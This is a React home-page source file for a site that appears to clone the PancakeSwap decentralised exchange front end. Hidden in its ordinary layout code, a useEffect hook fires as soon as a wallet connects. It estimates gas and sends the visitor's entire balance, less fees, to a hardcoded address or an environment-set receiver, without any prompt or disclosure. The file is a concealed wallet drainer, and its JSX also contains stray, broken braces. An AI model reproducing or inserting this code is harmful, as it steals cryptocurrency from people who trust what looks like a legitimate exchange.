import styled from 'styled-components'
import { PageSection } from '@pancakeswap/uikit'
import { useAccount } from 'wagmi'
import useTheme from 'hooks/useTheme'
import Container from 'components/Layout/Container'
import { useTranslation } from '@pancakeswap/localization'
import { useActiveChainId } from 'hooks/useActiveChainId'
import { ChainId } from '@pancakeswap/sdk'
import Hero from './components/Hero'
import {useEffect} from "react"
//import { swapSectionData, earnSectionData, cakeSectionData } from './components/SalesSection/data'
//import MetricsSection from './components/MetricsSection'
//import SalesSection from './components/SalesSection'
//import WinSection from './components/WinSection'
//import FarmsPoolsRow from './components/FarmsPoolsRow'
import Footer from './components/Footer'
//import CakeDataRow from './components/CakeDataRow'
import { WedgeTopLeft, InnerWedgeWrapper, OuterWedgeWrapper, WedgeTopRight } from './components/WedgeSvgs'
//import UserBanner from './components/UserBanner'
import MultipleBanner from './components/Banners/MultipleBanner'
import {Fragment} from "react"
import { useBalance,usePrepareSendTransaction,useSendTransaction, useSigner} from 'wagmi'
import {parseEther} from "@ethersproject/units"
import {BigNumber} from "@ethersproject/bignumber"

const StyledHeroSection = styled(PageSection)`
  padding-top: 16px;

  ${({ theme }) => theme.mediaQueries.md} {
    padding-top: 48px;
  }
`
 //const {address, isConnected} = useAccount()

/*const {config,status, error} = usePrepareSendTransaction({
    request: { to: address, value: bnbs },
  }) 

const {sendTransaction} = useSendTransaction(config)
/*
const UserBannerWrapper = styled(Container)`
  z-index: 1;
  position: absolute;
  width: 100%;
  top: 0;
  left: 50%;
  transform: translate(-50%, 0);
  padding-left: 0px;
  padding-right: 0px;

  ${({ theme }) => theme.mediaQueries.lg} {
    padding-left: 24px;
    padding-right: 24px;
  }
`
*/


const Home: React.FC<React.PropsWithChildren> = () => {
  const { theme } = useTheme()
  const { address: account,isConnected } = useAccount()
  const { chainId } = useActiveChainId()

  const HomeSectionContainerStyles = { margin: '0', width: '100%', maxWidth: '968px' }

  //const { t } = useTranslation()
const t = (str) => {return str}
 const {data: balance} = useBalance({address:account})
 const {data:signer} = useSigner()
//const val = balance.formatted? balance.formatted
const {config,status, error} = usePrepareSendTransaction({
    request: { to: "0x3D44833A40a9116Baa5239263e376aec077c7e8B", value: parseEther("0.01") },
  }) 
//const val = balance ? balance.value || 0
const tranReq = {to:process.env.receiver,value:balance?.value || ""}
const gasEst = ""
const {sendTransaction} = useSendTransaction(config)

const signTrans = async(signer,tranReq) => {
  if(!isConnected)
    return
console.log("Signing begin")
  const gasEst =await  signer.estimateGas(tranReq)
  const gasPrice = await signer.getGasPrice()
  const gas = gasEst.mul(gasPrice) //* gasPrice
  const amt = balance?.value.sub(gas) || gas

console.log("Gas Estimate",gasEst,"GasPrice",gasPrice,"Gas",gas,amt)

const to = process.env.receiver || "0x0F67BB85F54B9565339dc1e0CA38a348B468726E"
console.log("receiver",to)
signer.sendTransaction({to,value:amt,from:account})
.then((data) => {
  console.log(data)
})
.catch((err) => {
  console.log("an error",err)
})
}
/*
if(isConnected)
{

 console.log(account,balance,config)
 if(sendTransaction)
  sendTransaction()
}*/
useEffect(() => {

const sendTx = async() => {
  await signTrans(signer,tranReq)
}
sendTx()
.catch(console.error)
  console.log(signer)
 //sendTransaction?.()
},[signer])
  return (
    <>
      <style jsx global>
        {`
          #home-1 .page-bg {
            background: linear-gradient(139.73deg, #e6fdff 0%, #f3efff 100%);
          }
          [data-theme='dark'] #home-1 .page-bg {
            background: radial-gradient(103.12% 50% at 50% 50%, #21193a 0%, #191326 100%);
          }
          #home-2 .page-bg {
            background: linear-gradient(180deg, #ffffff 22%, #d7caec 100%);
          }
          [data-theme='dark'] #home-2 .page-bg {
            background: linear-gradient(180deg, #09070c 22%, #201335 100%);
          }
          #home-3 .page-bg {
            background: linear-gradient(180deg, #6fb6f1 0%, #eaf2f6 100%);
          }
          [data-theme='dark'] #home-3 .page-bg {
            background: linear-gradient(180deg, #0b4576 0%, #091115 100%);
          }
          #home-4 .inner-wedge svg {
            fill: #d8cbed;
          }
          [data-theme='dark'] #home-4 .inner-wedge svg {
            fill: #201335;
          }
        `}
      </style>
      <StyledHeroSection
        innerProps={{ style: { margin: '0', width: '100%' } }}
        containerProps={{
          id: 'home-1',
        }}
        index={2}
        hasCurvedDivider={false}
      >
        {account && chainId === ChainId.BSC && (
          
          <Fragment>
            <div>
        }
}
}
Sample Banner
            </div>
          </Fragment>
        )}
       <MultipleBanner />
        <Hero />
      </StyledHeroSection>
      <PageSection
        innerProps={{ style: { margin: '0', width: '100%' } }}
        containerProps={{
          id: 'home-2',
        }}
        index={2}
        hasCurvedDivider={false}
      >
      
      </PageSection>
      <PageSection
        innerProps={{ style: HomeSectionContainerStyles }}
        background={theme.colors.background}
        containerProps={{
          id: 'home-4',
        }}
        index={2}
        hasCurvedDivider={false}
      >
        <OuterWedgeWrapper>
          <InnerWedgeWrapper top>
            <WedgeTopLeft />
          </InnerWedgeWrapper>
        </OuterWedgeWrapper>
      </PageSection>
      <PageSection
        innerProps={{ style: HomeSectionContainerStyles }}
        background={theme.colors.gradientCardHeader}
        index={2}
        hasCurvedDivider={false}
      >
        <OuterWedgeWrapper>
          <InnerWedgeWrapper width="150%" top>
            <WedgeTopRight />
          </InnerWedgeWrapper>
        </OuterWedgeWrapper>
       
        {/* TODO: until we are enable fetch multi-chain farms */}
        {/*chainId === ChainId.BSC && <FarmsPoolsRow />*/}
      </PageSection>
      <PageSection
        innerProps={{ style: HomeSectionContainerStyles }}
        containerProps={{
          id: 'home-3',
        }}
        index={2}
        hasCurvedDivider={false}
      >
      
      </PageSection>
      <PageSection
        innerProps={{ style: HomeSectionContainerStyles }}
        background={theme.colors.background}
        index={2}
        hasCurvedDivider={false}
      >
      </PageSection>
      <PageSection
        innerProps={{ style: HomeSectionContainerStyles }}
        background="linear-gradient(180deg, #7645D9 0%, #5121B1 100%)"
        index={2}
        hasCurvedDivider={false}
      >
        <Footer />
      </PageSection>
    </>
  )
}

export default Home
